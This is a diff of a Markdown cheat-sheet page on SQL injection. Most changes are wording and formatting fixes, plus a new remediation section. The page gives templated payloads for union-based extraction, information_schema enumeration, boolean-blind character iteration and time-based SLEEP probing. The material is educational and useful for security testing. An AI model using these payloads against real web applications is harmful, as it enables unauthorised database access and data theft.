@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # SQL Injection
 
 **SQL Injection (SQLi)** is a common and dangerous web security vulnerability that allows attackers to interfere with the queries an application makes to its database.
@@ -22,16 +8,16 @@ It occurs when untrusted input is inserted directly into an SQL query without pr
 
 There are various forms of SQL injection attacks, each targeting different aspects of how SQL queries interact with the database.
 
-## <mark style="color:blue;">In-Band</mark>&#x20;
+## <mark style="color:orange;">In-Band</mark>&#x20;
 
-Refers to the same method of communication being used to exploit the vulnerability and also receive the results.
+Refers to the same method of communication being used to exploit the vulnerability, and also to receive the results.
 
-### <mark style="color:purple;">Union-Based</mark>
+### <mark style="color:red;">Union-Based</mark>
 
-Use the SQL `UNION` operator to return additional results to the page, letting the extraction of large amounts of data.
+Use the SQL `UNION` operator to return additional results to the page, allowing the extraction of large amounts of data.
 
-#### <mark style="color:orange;">Case 1</mark>
-
+{% tabs %}
+{% tab title="Case 1" %}
 * Determining the number of columns
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -57,7 +43,7 @@ $url/query?$column=$value UNION SELECT 1,2,3 #Try Until there's no message error
 
 ***
 
-* Check database name
+* Check the database name
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -68,7 +54,7 @@ $url/query?$column=$changedvalue UNION $found,database() #Try to get database
 
 ***
 
-* Check information schema for DB and tables information
+* Check the information schema for the DB and table information
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -83,7 +69,7 @@ the `$dbfound` value is the result of the previous query
 
 ***
 
-* Check information schema for DB and tables information
+* Check the information schema for the DB and table information
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -99,11 +85,13 @@ $url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM info
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
 0 UNION SELECT 1,2,group_concat($value1,$value2) FROM $tablefound
-#Obtain values from the table we needed
+#Obtain the values from the table we needed
 ```
 {% endcode %}
+{% endtab %}
 
-#### <mark style="color:orange;">Case 2</mark>
+{% tab title="Case 2" %}
+
 
 * Check if  vulnerable by sending a malformed petition with `'`
 
@@ -150,16 +138,18 @@ About | id,firstName,lastName,pfpLink,role,shortRole,bio,$columname None #The re
 #The response is the information that we were looking for
 ```
 {% endcode %}
+{% endtab %}
+{% endtabs %}
 
-### <mark style="color:purple;">Error-Based</mark>
+### <mark style="color:red;">Error-Based</mark>
 
-Obtaining information about the database structure as error messages from the database are printed directly to the browser screen.
+Obtaining information about the database structure as error messages from the database, is printed directly to the browser screen.
 
-## <mark style="color:blue;">Blind (Inferential)</mark>
+## <mark style="color:orange;">Blind (Inferential)</mark>
 
-Results of the attack can't directly be seen on the screen, we get little to no feedback to confirm whether our injected queries were.
+Results of the attack can't be directly seen on the screen, we get little to no feedback to confirm whether our injected queries were.
 
-### <mark style="color:purple;">Boolean Based</mark>
+### <mark style="color:red;">Boolean Based</mark>
 
 Use the response we receive back from our injection if this only has two outcomes
 
@@ -183,13 +173,13 @@ $url/query?$column=$changedvalue' UNION SELECT 1,2,3; #Try Until the result chan
 
 ***
 
-* Find database name by iteration
+* Find the database name by iteration
 
 <pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue' UNION SELECT $found where database() like '%';
 </strong>#The value % will match anything true
 $url/query?$column=$changedvalue' UNION SELECT $found where database() like 'a%'; #Try a
 $url/query?$column=$changedvalue' UNION SELECT $found where database() like 'b%'; #Try b
-#Repeat with every letter until found a value that gets true
+#Repeat with every letter until a value that gets true is found
 $url/query?$column=$changedvalue' UNION SELECT $found where database() like '$lettera%';
 #Make the same process for the next value
 $url/query?$column=$changedvalue' UNION SELECT $found where database() LIKE '$letter$letter2a$%';
@@ -199,23 +189,23 @@ $url/query?$column=$changedvalue' UNION SELECT $found where database() LIKE '$le
 {% hint style="info" %}
 `$found` is the union value that has been caught in the previous step
 
-`$letter` is the value that returns true in each iteration
+`$letter` is the value which returns true in each iteration
 {% endhint %}
 
 ***
 
-* Find Table name by iteration
+* Find the table name by iteration
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
 $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name LIKE 'a%';
-#Repeat until found all table names
+#Repeat until all table names are found
 ```
 {% endcode %}
 
 ***
 
-* Find column by iteration
+* Find the column by iteration
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -226,7 +216,7 @@ $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WH
 
 ***
 
-* Find objective value
+* Find the objective value
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -237,10 +227,10 @@ $url/query?$column=$changedvalue' FROM $table_found WHERE %column_found LIKE 'a%
 
 ***
 
-* &#x20;Handle of value exceptions
+* &#x20;Handling value exceptions
 
 {% hint style="warning" %}
-If at any point of iteration, you found a value that you don't need to get you must exclude it to restringe your injection
+If at any point of iteration, you find a value that you don't need, you must exclude it to restrict your injection
 {% endhint %}
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -250,10 +240,10 @@ $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WH
 {% endcode %}
 
 {% hint style="info" %}
-`$notobjective`refers to the value that we found but we don't need
+`$notobjective`refers to the value that we found, but we don't need it
 {% endhint %}
 
-### <mark style="color:purple;">Time-Based</mark>
+### <mark style="color:red;">Time-Based</mark>
 
 Make use of the time a response is generated to the request to determine if the query value was found or not. It is used when we don't get a visual return to the injection.
 
@@ -273,7 +263,7 @@ The time of an error request is always less than a correct query
 
 ***
 
-* Make a Boolean-based iterative process to map DB, tables, and columns you need
+* Make a Boolean-based iterative process to map the DB, tables, and columns you need
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -285,7 +275,7 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM informat
 
 ***
 
-* Make Boolean based iterative process to find the value you need
+* Make a boolean-based iterative process to find the value you need
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
@@ -294,13 +284,23 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM $table_f
 ```
 {% endcode %}
 
-## <mark style="color:blue;">Out Of Band</mark>
+## <mark style="color:orange;">Out Of Band</mark>
 
-Depends on the DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;
+Depends on the DB feature of making some kind of external network call based on the results from an SQL query. It is classified by having two different communication channels:&#x20;
 
-* One to launch the attack where the SQLi can be done to send a query
+* One is to launch the attack where the SQLi can be done to send a query
 * The other is to gather the results by intercepting responses from a database or another external service
 
-## <mark style="color:blue;">**Second-Order (Stored)**</mark>
+## <mark style="color:orange;">**Second-Order (Stored)**</mark>
 
 In this scenario, the attacker injects malicious data into the system that is not immediately executed but is stored and later used by the application. The SQL injection occurs at a later time when the data is used in another query.
+
+## <mark style="color:blue;">Remediation Actions</mark>
+
+* Don't concatenate or interpolate user input directly into SQL queries
+* Use parameterized queries or prepared statements provided by the database library
+* Validate user inputs strictly, ensuring they match expected formats and types
+* Escape input only as a last resort, and only using safe, built-in escaping functions
+* Limit database permissions so the application user account has only the necessary access
+* Use stored procedures to encapsulate SQL logic where appropriate, reducing exposure to direct query manipulation
+* Keep your database engine and ORM libraries up to date with security patches
